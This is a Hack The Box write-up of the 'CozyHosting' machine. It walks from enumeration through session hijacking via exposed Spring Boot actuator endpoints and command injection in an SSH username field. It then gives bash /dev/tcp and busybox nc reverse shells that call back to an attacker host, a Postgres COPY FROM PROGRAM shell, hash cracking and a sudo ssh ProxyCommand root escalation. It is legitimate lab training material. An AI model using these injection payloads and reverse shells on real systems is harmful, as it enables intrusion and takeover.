+++
date = '2026-06-09T14:39:40-04:00'
title = 'CozyHosting'
tags = ["htb", "easy", "command injection","sudo","postgresql","spring boot"]
+++

![](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/eaed7cd01e84ef5c6ec7d949d1d61110.png)

https://www.hackthebox.com/machines/CozyHosting
## OS: Linux
``` IP
10.129.229.88
```
## Credentials:

| Username | Password           | Notes/Hash                        |
| -------- | ------------------ | --------------------------------- |
| `josh`   | `manchesterunited` | from cracking hahes from database |

---
## `nmap` results:
 ```
 # Nmap 7.99 scan initiated Tue Jun  9 11:26:24 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/CozyHosting 10.129.229.88
Nmap scan report for 10.129.229.88
Host is up, received echo-reply ttl 63 (0.020s latency).
Scanned at 2026-06-09 11:26:25 EDT for 20s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
 ```
 modify `/etc/hosts` and run `nmap` again:
 ```
 # Nmap 7.99 scan initiated Tue Jun  9 11:33:35 2026 as: /usr/lib/nmap/nmap -p80 -sC -sV -vv -oA nmap/HTTPDefaultScan 10.129.229.88
Nmap scan report for cozyhosting.htb (10.129.229.88)
Host is up, received reset ttl 63 (0.018s latency).
Scanned at 2026-06-09 11:33:35 EDT for 7s

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  9 11:33:42 2026 -- 1 IP address (1 host up) scanned in 7.52 seconds
 ```

 
---
## Attack + Enum Vectors
- TCP 80: HTTP nginx 1.18.0
- TCP 22: SSH OpenSSH 8.9p1

### UDP (161 SNMP)?
- closed


---
## Service Enum Notes:
### Web Service: `Gobuster` / `fuff`
```
gobuster dir -u http://cozyhosting.htb/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100 -r -exclude-length 0
```
did not really return anything interesting, looking at hints we should look at 500 error page? So then navigating to the `/error` page: we see something about "Whitelabel Error Page". Googling that reveals that the target web service might be using `Spring Boot`

Running `nikto`:
```
nikto -h http://cozyhosting.htb
```
also revealed spring boot frame work too, and also:
```
+ [750002] /actuator/health: Spring Boot Actuator health endpoint exposed. See: https://docs.spring.io/spring-boot/docs/current/actuator-api/html/#health
+ [750004] /actuator/env: Spring Boot Actuator endpoint exposed (valid JSON response). See: https://docs.spring.io/spring-boot/docs/current/actuator-api/html/
+ [750004] /actuator/mappings: Spring Boot Actuator endpoint exposed (valid JSON response). See: https://docs.spring.io/spring-boot/docs/current/actuator-api/html/
+ [750004] /actuator/beans: Spring Boot Actuator endpoint exposed (valid JSON response). See: https://docs.spring.io/spring-boot/docs/current/actuator-api/html/
```
some directories: on `/actuator/mappings` had a `/sessions`
```
http://cozyhosting.htb/actuator/sessions
```
which revealed:
```
{"D3AAF46EB7FD432BD688D49F134EB5CF":"kanderson"}
```
seems like a cookie/session id, let's try to do a hijack session attack: `Ctrl + Shift + C` to open up `Inspector`, then go to `Storage` and change our session ID to the one found. Then, let's browse to the login page: `http://cozyhosting.htb/login` and we got into the admin dashboard! Let's see if there anywhere we can upload or trigger reverse shell:

and we see a page with `Include host into automatic patching`


---
## Initial Foothold
`Include host into automatic patching` is most like executing a command, possibly with SSH? Ealier in `/actuator/mappings` there is actually an `/executessh`, and since it is asking for hostname and username, we can guess it's executing a `ssh` similar to:
```
ssh username@hostname
```
So maybe it is vulnerable to a command injection attack. If we want to inject command, the ssh command must be ended and execute something like:
```
ssh test;curl http://HTB_VPN_IP#@hostname
```
The `@hostname` part will be commented out since `#` is a comment in `bash`

First set up `python` `http` server:
```
python3 -m http.server 80
```

Okay so let's enter `test;curl http://HTB_VPN_IP#` for `username`
```
Invalid hostname!
```
seems like we still need to enter a `hostname` though let's enter `localhost` and then enter the same test command:
```
Username can't contain whitespaces!
```
maybe `${IFS}` (internal field separator in bash) in `username` for `space`?
```
test;curl${IFS}http://HTB_VPN_IP#
```
```
ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash:
```
So command is executing, but there is an error. `command1&command2` In bash: command 2 will be executed immediately while command 1 executes in background
```
test&curl${IFS}http://HTB_VPN_IP#
```
and we got a `GET` request on our `http` server! Now we try getting shell:
```
sudo nc -lvnp 1337
```
after trying a bunch of reverse shells commands, for example `busybox`, `nc`, `bash -i`, doesn't seem like it was working. I got connections but didn't end up getting a shell. Looking at `0xdf` I learned that java applications can be quite troublesome when trying to execute commands with special characters. 

Let's first host our script at `http 8000`
```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/HTB_VPN_IP/1337 0>&1'
```
```
python3 -m http.server 8000
```
and then on username:
```
test&curl${IFS}http://HTB_VPN_IP:8000/rev.sh${IFS}-o${IFS}/tmp/rev.sh#
```
and execute it
```
test&bash${IFS}/tmp/rev.sh#
```
Perfect! We got a shell now, lets's try upgrading it
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
then
```
export TERM=xterm
```
`Ctrl + Z` to background
```
stty raw -echo;fg
```
```
reset
```
and enter my terminal size:
```
stty rows 48 cols 210
```
Now we get a fully functioning shell!

---
## Priv Esc
```
ss -nptlu
```
shows listening at `postgres` port, and default password doesn't work:
```
psql -U postgres -h localhost
```
shows a service at port `8080`, possible a http server, let's pivot
```
chisel server -p 9999 --reverse
```
transfer `chisel` onto target then:
```
./chisel client HTB_VPN_IP:9999 R:8088:127.0.0.1:8080
```
we binded service from `8080` to `8088` on our kali: but it seems like we fell in a rabbit hole, this service looks identical as the one in port `80`

Let's transfer the `cloudhosting-0.0.1.jar` to our kali to do analysis. `.jar` file are zip of files, so we can unzip it:
```
unzip cloudhosting-0.0.1.jar
```
Let's enumerate the files that are not `.class`:
```
find . -type f | grep -iv ".class$"
```
still a lot of `.jar` files, filter that out:
```
find . -type f | grep -iv ".class$" | grep -iv ".jar$"
```
a lot of `.js` and `.css` files:
```
find . -type f | grep -iv ".class$" | grep -iv ".jar$" | grep -iv ".css$" | grep -iv ".js$"
```
filter out `.map` and `.png`:
```
find . -type f | grep -iv ".class$" | grep -iv ".jar$" | grep -iv ".css$" | grep -iv ".js$" | grep -iv ".map$" | grep -iv ".png$" 
```
and we see some interesting files:
```
./BOOT-INF/classes/templates/admin.html
./BOOT-INF/classes/templates/login.html
./BOOT-INF/classes/templates/index.html
./BOOT-INF/classes/application.properties
./BOOT-INF/classpath.idx
./BOOT-INF/layers.idx
./META-INF/maven/htb.cloudhosting/cloudhosting/pom.xml
./META-INF/maven/htb.cloudhosting/cloudhosting/pom.properties
./META-INF/MANIFEST.MF
```
```
cat ./META-INF/maven/htb.cloudhosting/cloudhosting/pom.properties
```
nothing interesting:
```
cat ./BOOT-INF/classes/application.properties
```
and shows:
```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```
so we got a database password `Vg&nvzAQ7XxR`, and let's go back and try to enumerate the `postgres` database with the password
```
psql -U postgres -h localhost
```
and we logged in! List databases:
```
\list
```
use `cozyhosting`:
```
\c cozyhosting
```
list tables:
```
\d
```
then show entries from `users`
```
select * from users;
```
returned:
```
kanderson:$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```
Let me start trying to crack these hashes with `john`

While we are cracking, we can try to get RCE to see if we can with `postgres` user
```
CREATE TABLE cmd_exec(cmd_output text);
```
set up  listener:
```
sudo nc -lvnp 1337
```
then:
```
COPY cmd_exec FROM PROGRAM 'busybox nc HTB_VPN_IP 1337 -e bash';
```
and we got shell as `postgres` user. But let's go to `john` first

`john` returned one password at this point: `manchesterunited` let me try if this password works for `josh` or `root`. 
```
su josh
```
Appearantly worked for `josh`:
```
sudo -l
```
enter the password, returned:
```
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```
oh well that's easy from now: https://gtfobins.org/gtfobins/ssh/
```
sudo /usr/bin/ssh -o ProxyCommand=';/bin/bash 0<&2 1>&2' x
```
and we got root!

Therefore, pwn'd.

---
## Conclusion & Remediation
This box had a lot of unfamiliarities, but had knowledges I am going to be adding and applying in the future: look up error pages to potentially reveal target framework and java applications can be tricky when dealing with special characters. I also reviewd some concepts that I knew before but deepened my understanding, despite being an `easy` box, it was very worth doing.

To remediate for similar attacks: system administrators needs to make sure session keys and IDs are not leaked so if any files contains session IDs should not be readable by the public. In addition, input fields needs to sanitize for command injection attacks and the passwords to log in on to web dashboard should not be reused as user password. Lastly, miconfigured `sudo` privileges needs to be removed following the principle of least privileges.